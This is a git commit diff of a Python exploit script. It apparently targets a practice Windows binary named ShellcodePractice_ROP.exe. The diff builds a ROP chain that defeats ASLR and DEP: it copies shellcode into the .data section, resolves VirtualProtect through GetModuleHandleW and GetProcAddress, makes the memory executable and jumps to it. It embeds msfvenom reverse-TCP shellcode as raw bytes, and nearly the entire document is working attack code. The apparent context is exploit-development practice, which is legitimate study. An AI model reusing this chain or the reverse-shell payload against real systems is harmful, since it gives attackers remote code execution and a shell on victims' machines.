f70fda5e64da9412defe701d222dc7d4e54762ac
uttervitriol <uttervitriol@gmail.com>
2023-05-26 19:33:03 -0400

    that was something

--- aslr_dep_exp.py
+++ aslr_dep_exp.py
@@ -2,67 +2,72 @@ import socket
 import struct
 
 
-shellcode = b""
+def do_shellcode(img_base, buff_addr):
+    shellcode = b""
 
-# int WSAStartup(
-#         WORD      wVersionRequired,   rcx
-#   [out] LPWSADATA lpWSAData           rdx
-# );
+    # int WSAStartup(
+    #         WORD      wVersionRequired,   rcx
+    #   [out] LPWSADATA lpWSAData           rdx
+    # );
 
-# call WSASartup
-shellcode += b"\x48\xBA\x00P\xdd\x1b\xf6\x7f\x00\x00"       # mov rdx, 0x7ff61bdd5000
-shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"    # mov rcx, 0x202
-shellcode += b"\x48\xB8\x10\xeb\xf8\xb9\xfe\x7f\x00\x00"    # mov rax, WS2_32!WSAStartup
+    # call WSASartup
+    shellcode += b"\x48\xBA"
+    shellcode += struct.pack('<Q', buff_addr)       # mov rdx, 0x7ff61bdd5000
+    shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"    # mov rcx, 0x202
+    shellcode += b"\x48\xBF"    # mov rax, WS2_32!WSAStartup
+    shellcode += struct.pack('<Q', img_base + 0x30f8)
+    shellcode += b"\x48\x8B\x07"
+    shellcode += b"\x48\x81\xEC\x08\x10\x00\x00"
+    shellcode += b"\xFF\xd0"                                    # call rax
 
-shellcode += b"\x48\x81\xEC\xE8\x09\x00\x00"                # sub rsp, 0x9E8
-shellcode += b"\xFF\xD0"                                    # call rax
+    # add rsp, b8
+    # shellcode += b"\x48\x81\xC4\xE8\x09\x00\x00"
 
-# add rsp, b8
-# shellcode += b"\x48\x81\xC4\xE8\x09\x00\x00"
+    # msfvenom shell_reverse_tcp
+    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
+    shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x87\x06\x21\x93"
+    shellcode += b"\x6a\xb6\xd9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
+    shellcode += b"\xff\xe2\xf4\x14\xcf\x85\xc5\x63\x82\x76\xd9\xe8"
+    shellcode += b"\x87\x47\x70\xd2\x3a\xe4\x88\xbe\xcf\x37\xf3\xf6"
+    shellcode += b"\x22\x3d\x8b\x88\xcf\x8d\x73\x8b\x22\x3d\x8b\xc8"
+    shellcode += b"\xcf\x8d\x53\xc3\x22\xb9\x6e\xa2\xcd\x4b\x10\x5a"
+    shellcode += b"\x22\x87\x19\x44\xbb\x67\x5d\x91\x46\x96\x98\x29"
+    shellcode += b"\x4e\x0b\x60\x92\xab\x54\x34\xba\xc6\x57\x69\x18"
+    shellcode += b"\x38\x96\x52\xaa\xbb\x4e\x20\x43\xe1\x36\x51\xe8"
+    shellcode += b"\x87\x06\x69\x16\xaa\xc2\xbe\xa0\x86\xd6\x71\x18"
+    shellcode += b"\x22\xae\x9d\x63\xc7\x26\x68\x92\xba\x55\x8f\xa0"
+    shellcode += b"\x78\xcf\x60\x18\x5e\x3e\x91\xe9\x51\x4b\x10\x5a"
+    shellcode += b"\x22\x87\x19\x44\xc6\xc7\xe8\x9e\x2b\xb7\x18\xd0"
+    shellcode += b"\x67\x73\xd0\xdf\x69\xfa\xfd\xe0\xc2\x3f\xf0\xe6"
+    shellcode += b"\xb2\xee\x9d\x63\xc7\x22\x68\x92\xba\xd0\x98\x63"
+    shellcode += b"\x8b\x4e\x65\x18\x2a\xaa\x90\xe9\x57\x47\xaa\x97"
+    shellcode += b"\xe2\xfe\xd8\x38\xc6\x5e\x60\xcb\x34\xef\x83\xa9"
+    shellcode += b"\xdf\x47\x78\xd2\x30\xfe\x5a\x04\xa7\x47\x73\x6c"
+    shellcode += b"\x8a\xee\x98\xb1\xdd\x4e\xaa\x81\x83\xe1\x26\x17"
+    shellcode += b"\x78\x5b\x68\x2d\x1d\xc5\xeb\xb7\xb4\x34\x21\x93"
+    shellcode += b"\x2b\xe0\x90\x61\x61\x4e\xa0\x7f\xca\xb7\xd9\xe8"
+    shellcode += b"\xce\x8f\xc4\xda\xd6\xb4\xd9\xf3\xbe\xc6\x89\x92"
+    shellcode += b"\xc5\xf7\x8d\xa1\x0e\xe2\x6d\x1a\x9b\xf7\x63\xa4"
+    shellcode += b"\xf0\x20\x26\x6c\xbf\xfa\x50\x02\xef\x07\x20\x93"
+    shellcode += b"\x6a\xef\x98\x52\xae\x86\x4a\x93\x95\x63\x89\xb8"
+    shellcode += b"\xca\x37\xe8\xde\x5b\x76\x91\x17\x47\x4e\xa8\x51"
+    shellcode += b"\x22\x49\x19\xa0\x0e\xc7\x60\x29\x80\xb9\x06\x08"
+    shellcode += b"\x78\xd3\x69\x1a\xad\xdc\xc9\xa9\xdf\x4a\xa8\x71"
+    shellcode += b"\x22\x3f\x20\xa9\x3d\x9f\x84\xe7\x0b\x49\x0c\xa0"
+    shellcode += b"\x06\xc2\x61\x91\x6a\xb6\x90\x50\xe4\x6b\x45\x93"
+    shellcode += b"\x6a\xb6\xd9\xe8\xc6\x56\x60\xc3\x22\x3f\x3b\xbf"
+    shellcode += b"\xd0\x51\x6c\xa2\xaa\xdc\xd4\xb1\xc6\x56\xc3\x6f"
+    shellcode += b"\x0c\x71\x9d\xcc\xd3\x07\x20\xdb\xe7\xf2\xfd\xf0"
+    shellcode += b"\x41\x06\x49\xdb\xe3\x50\x8f\xb8\xc6\x56\x60\xc3"
+    shellcode += b"\x2b\xe6\x90\x17\x47\x47\x71\xda\x95\x7e\x94\x61"
+    shellcode += b"\x46\x4a\xa8\x52\x2b\x0c\xa0\x24\xb8\x80\xde\x46"
+    shellcode += b"\x22\x87\x0b\xa0\x78\xcc\xaa\x9d\x2b\x0c\xd1\x6f"
+    shellcode += b"\x9a\x66\xde\x46\xd1\x46\x6c\x4a\xd1\x47\x9b\x35"
+    shellcode += b"\xff\x0b\x44\x17\x52\x4e\xa2\x57\x42\x8a\xdf\x94"
+    shellcode += b"\x8d\x86\xda\x73\x1f\xb3\x62\xaf\x94\x74\x4e\xf9"
+    shellcode += b"\x6a\xef\x98\x61\x5d\xf9\xf4\x93\x6a\xb6\xd9"
 
-# msfvenom shell_reverse_tcp
-shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
-shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x87\x06\x21\x93"
-shellcode += b"\x6a\xb6\xd9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
-shellcode += b"\xff\xe2\xf4\x14\xcf\x85\xc5\x63\x82\x76\xd9\xe8"
-shellcode += b"\x87\x47\x70\xd2\x3a\xe4\x88\xbe\xcf\x37\xf3\xf6"
-shellcode += b"\x22\x3d\x8b\x88\xcf\x8d\x73\x8b\x22\x3d\x8b\xc8"
-shellcode += b"\xcf\x8d\x53\xc3\x22\xb9\x6e\xa2\xcd\x4b\x10\x5a"
-shellcode += b"\x22\x87\x19\x44\xbb\x67\x5d\x91\x46\x96\x98\x29"
-shellcode += b"\x4e\x0b\x60\x92\xab\x54\x34\xba\xc6\x57\x69\x18"
-shellcode += b"\x38\x96\x52\xaa\xbb\x4e\x20\x43\xe1\x36\x51\xe8"
-shellcode += b"\x87\x06\x69\x16\xaa\xc2\xbe\xa0\x86\xd6\x71\x18"
-shellcode += b"\x22\xae\x9d\x63\xc7\x26\x68\x92\xba\x55\x8f\xa0"
-shellcode += b"\x78\xcf\x60\x18\x5e\x3e\x91\xe9\x51\x4b\x10\x5a"
-shellcode += b"\x22\x87\x19\x44\xc6\xc7\xe8\x9e\x2b\xb7\x18\xd0"
-shellcode += b"\x67\x73\xd0\xdf\x69\xfa\xfd\xe0\xc2\x3f\xf0\xe6"
-shellcode += b"\xb2\xee\x9d\x63\xc7\x22\x68\x92\xba\xd0\x98\x63"
-shellcode += b"\x8b\x4e\x65\x18\x2a\xaa\x90\xe9\x57\x47\xaa\x97"
-shellcode += b"\xe2\xfe\xd8\x38\xc6\x5e\x60\xcb\x34\xef\x83\xa9"
-shellcode += b"\xdf\x47\x78\xd2\x30\xfe\x5a\x04\xa7\x47\x73\x6c"
-shellcode += b"\x8a\xee\x98\xb1\xdd\x4e\xaa\x81\x83\xe1\x26\x17"
-shellcode += b"\x78\x5b\x68\x2d\x1d\xc5\xeb\xb7\xb4\x34\x21\x93"
-shellcode += b"\x2b\xe0\x90\x61\x61\x4e\xa0\x7f\xca\xb7\xd9\xe8"
-shellcode += b"\xce\x8f\xc4\xda\xd6\xb4\xd9\xf3\xbe\xc6\x89\x92"
-shellcode += b"\xc5\xf7\x8d\xa1\x0e\xe2\x6d\x1a\x9b\xf7\x63\xa4"
-shellcode += b"\xf0\x20\x26\x6c\xbf\xfa\x50\x02\xef\x07\x20\x93"
-shellcode += b"\x6a\xef\x98\x52\xae\x86\x4a\x93\x95\x63\x89\xb8"
-shellcode += b"\xca\x37\xe8\xde\x5b\x76\x91\x17\x47\x4e\xa8\x51"
-shellcode += b"\x22\x49\x19\xa0\x0e\xc7\x60\x29\x80\xb9\x06\x08"
-shellcode += b"\x78\xd3\x69\x1a\xad\xdc\xc9\xa9\xdf\x4a\xa8\x71"
-shellcode += b"\x22\x3f\x20\xa9\x3d\x9f\x84\xe7\x0b\x49\x0c\xa0"
-shellcode += b"\x06\xc2\x61\x91\x6a\xb6\x90\x50\xe4\x6b\x45\x93"
-shellcode += b"\x6a\xb6\xd9\xe8\xc6\x56\x60\xc3\x22\x3f\x3b\xbf"
-shellcode += b"\xd0\x51\x6c\xa2\xaa\xdc\xd4\xb1\xc6\x56\xc3\x6f"
-shellcode += b"\x0c\x71\x9d\xcc\xd3\x07\x20\xdb\xe7\xf2\xfd\xf0"
-shellcode += b"\x41\x06\x49\xdb\xe3\x50\x8f\xb8\xc6\x56\x60\xc3"
-shellcode += b"\x2b\xe6\x90\x17\x47\x47\x71\xda\x95\x7e\x94\x61"
-shellcode += b"\x46\x4a\xa8\x52\x2b\x0c\xa0\x24\xb8\x80\xde\x46"
-shellcode += b"\x22\x87\x0b\xa0\x78\xcc\xaa\x9d\x2b\x0c\xd1\x6f"
-shellcode += b"\x9a\x66\xde\x46\xd1\x46\x6c\x4a\xd1\x47\x9b\x35"
-shellcode += b"\xff\x0b\x44\x17\x52\x4e\xa2\x57\x42\x8a\xdf\x94"
-shellcode += b"\x8d\x86\xda\x73\x1f\xb3\x62\xaf\x94\x74\x4e\xf9"
-shellcode += b"\x6a\xef\x98\x61\x5d\xf9\xf4\x93\x6a\xb6\xd9"
+    return shellcode
 
 '''
 0x0000000140001018 : mov qword ptr [rsi], rax ; ret
@@ -81,6 +86,8 @@ shellcode += b"\x6a\xef\x98\x61\x5d\xf9\xf4\x93\x6a\xb6\xd9"
 0x0000000140001f4a : add esp, 0x5c0 ; pop rbp ; ret
 0x00000001400018e8 : add esp, 0x28 ; ret
 0x0000000140001c3f : add rsp, 0x18 ; ret
+0x0000000140001f17 : xchg esp, eax ; ret
+0x0000000140001821 : pop rbx ; pop rbp ; ret
 0x0000000140001001 : ret
 '''
 
@@ -99,6 +106,8 @@ class AddrOf:
     memcpy = 0x30c0
 
     # Gadgets in ShellcodePractice_ROP.exe.
+    PopRbxRbpRet = 0x1821
+    XchgEspEaxRet = 0x1f17
     MovQWordRsp8RaxRet = 0x101c
     JmpRax = 0x1012
     JmpQWordRax = 0x1016
@@ -127,6 +136,8 @@ class AddrOf:
         AddrOf.RtlAllocHeap += img_base
         AddrOf.memcpy += img_base
 
+        AddrOf.PopRbxRbpRet += img_base
+        AddrOf.XchgEspEaxRet += img_base
         AddrOf.MovQWordRsp8RaxRet += img_base
         AddrOf.JmpRax += img_base
         AddrOf.JmpQWordRax += img_base
@@ -158,67 +169,39 @@ def fmt(val):
 
 def gimme_buf(buff_addr, img_base):
     gadgets = AddrOf(img_base)
+    shellcode = do_shellcode(img_base, buff_addr)
     # kernelbase = "KERNELBASE.dll".encode("utf-16-le")
     kernelbase = b'K\x00E\x00R\x00N\x00E\x00L\x00B\x00A\x00S\x00E\x00.\x00D\x00L\x00L\x00\x00\x00'
-    virtualprotect = b'V\x00i\x00r\x00t\x00u\x00a\x00l\x00P\x00r\x00o\x00t\x00e\x00c\x00t\x00\x00\x00'
+    virtualprotect = b'VirtualProtect\x00\x00'
+    data_section = img_base + 0x5000
     payload = (
         b'q' +
-        b'\x90' * 0x150 +
         kernelbase +
         virtualprotect +
-        b'\x90' * (1591 - len(kernelbase) - len(virtualprotect) - 0x150) + 
+        shellcode + 
+        b'\x90' * (1591 - len(kernelbase) - len(virtualprotect) - len(shellcode)) +
 
-        ## Call GetProcessHeap
+        fmt(gadgets.PopRcxRet)+
+        fmt(data_section) + 
+        fmt(gadgets.PopRdxRet)+
+        fmt(buff_addr + 1)+
+        fmt(gadgets.PopR8Ret)+
+        fmt(0x800)+
         fmt(gadgets.PopRaxRet) +
-        fmt(gadgets.GetProcessHeap) +
+        fmt(gadgets.memcpy)+
         fmt(gadgets.JmpQWordRax)+
-
-        fmt(gadgets.MovQWordRsp8RaxRet) + # put value of rax ->
-        fmt(gadgets.PopRcxRet) + 
-        fmt(0) +                          # here
-
-        fmt(gadgets.PopRdxRet) + 
-        fmt(0)+
-
-        fmt(gadgets.PopR8Ret) + 
-        fmt(0x780) +
-
-        fmt(gadgets.PopRaxRet) +
-        fmt(gadgets.RtlAllocHeap) +
-
-        fmt(gadgets.PopRbxRet) +
-        fmt(gadgets.Ret) +
-
-        fmt(gadgets.JmpQWordRax) +
-        fmt(gadgets.PopRdiRet) + # 1
-        fmt(gadgets.PopRdiRet) + # 2 Gets yeeted
-        fmt(gadgets.PopRdiRet) + # 3 rbx
-        fmt(gadgets.PopRdiRet) + # 4 
-        fmt(gadgets.PopRsiRet) + # 5 Gets yeeted
-
-        fmt(gadgets.MovQWordRsp8RaxRet) +  # put value of rax ->
-        fmt(gadgets.PopRcxRet) +
-        fmt(0) +                           # here
         
-        fmt(gadgets.PopRdxRet) +
-        fmt(buff_addr + 1 + 0x150) +
-
-        fmt(gadgets.PopR8Ret) +
-        fmt(0x630) + 
-
-        fmt(gadgets.PopRaxRet) + 
-        fmt(gadgets.memcpy) + 
-        fmt(gadgets.JmpQWordRax) +
-
         fmt(gadgets.MovQWordRsp8RaxRet) +  # put value of rax ->
         fmt(gadgets.PopRcxRet) +
-        fmt(0) +                            # here
+        fmt(0) +                             # here
 
         # rbx gets put on the stack in getmodulehandle
         fmt(gadgets.PopRbxRet) +
         fmt(gadgets.PopRaxRet)+
 
-        ## Call GetModuleHandleW
+        # Call GetModuleHandleW
+        fmt(gadgets.PopRaxRet) +
+        fmt(buff_addr + 0x7d0) + 
         fmt(gadgets.PopRaxRet) +
         fmt(gadgets.GetModuleHandleW) +
         fmt(gadgets.JmpQWordRax) +
@@ -228,44 +211,38 @@ def gimme_buf(buff_addr, img_base):
         # fmt(0) +                             # here
 
         fmt(gadgets.PopRcxRet) + 
+        # Kernelbase
         fmt(gadgets.PopRaxRet) + # This gets overwritten with the address we wanted in getmodulehandlew
+        fmt(gadgets.Ret)+
+        fmt(gadgets.Ret)+
+        fmt(gadgets.Ret)+
+        # these get moved to the stack in get proc addr
+        fmt(gadgets.PopRbxRbpRet)+
+        fmt(gadgets.PopRaxRet)+
+        fmt(gadgets.PopR9Ret)+
+        fmt(gadgets.PopRsiRet)+
+        fmt(data_section)+
 
-        # this PopRaxRet gets overwritten in getmodulehandle with the same address
         fmt(gadgets.PopRaxRet) +
         fmt(gadgets.GetProcAddress) + 
-        fmt(gadgets.pop)
+        fmt(gadgets.PopRdxRet)+
+        fmt(data_section + len(kernelbase)) +
         fmt(gadgets.JmpQWordRax) +
+
         fmt(gadgets.Ret) +
-        fmt(gadgets.Ret) +
-        fmt(gadgets.Ret) +
-        fmt(gadgets.Ret)
-
-        #\x4B\x00\x45\x00\x52\x00\x4E\x00\x45\x00\x4C\x00\x42\x00\x41\x00\x53\x00\x45\x00\x2E\x00\x44\x00\x4C\x00\x4C\x00\x00\x00
-
-        # BOOL VirtualProtect(
-        #   [in]  LPVOID lpAddress,       rcx
-        #   [in]  SIZE_T dwSize,          rdx
-        #   [in]  DWORD  flNewProtect,    r8
-        #   [out] PDWORD lpflOldProtect   r9
-        # );
-
-        # # calling virtualprotect
-        # struct.pack('<Q', Gadgets.PopR9Ret) +     # pop r9 ; ret
-        # struct.pack('<Q', 0x7ff61bdd5000) +     # .data section ShellcodePracticeROP.exe
-
-        # struct.pack('<Q', 0x7ff61bdd1008) +     # pop r8 ; ret
-        # struct.pack('<Q', 0x40) +               # PAGE_EXECUTE_READWRITE
-
-        # struct.pack('<Q', 0x7ff61bdd1004) +     # pop rdx ; ret
-        # struct.pack('<Q', 0x7e6) +              # dwSize
-             
-        # struct.pack('<Q', 0x7ff61bdd1006) +     # pop rcx ; ret
-        # struct.pack('<Q', buff_addr) +          # buffer address
-
-        # struct.pack('<Q', 0x7ffeb89dc470) +     # kernelbase!virtualprotect
-
-        # struct.pack('<Q', buff_addr + 1)        # buffer address
-       
+        fmt(data_section) +         # overwritten with rbx -> PopRaxRet
+        fmt(gadgets.PopR8Ret) +     # overwritten with addr -> VirtualProtect
+        fmt(0x40)+                  # overwritten with rbp  -> PopR9Ret
+        fmt(data_section) +         # overwritten with rsi -> data_section
+        fmt(gadgets.PopR8Ret)+
+        fmt(0x40) +
+        fmt(gadgets.PopRdxRet) +
+        fmt(0xa00) +
+        fmt(gadgets.PopRcxRet) +
+        fmt(data_section) +
+        fmt(gadgets.Ret) + 
+        fmt(gadgets.JmpRax) +
+        fmt(data_section + len(kernelbase) + len(virtualprotect))
     )
     return payload
 
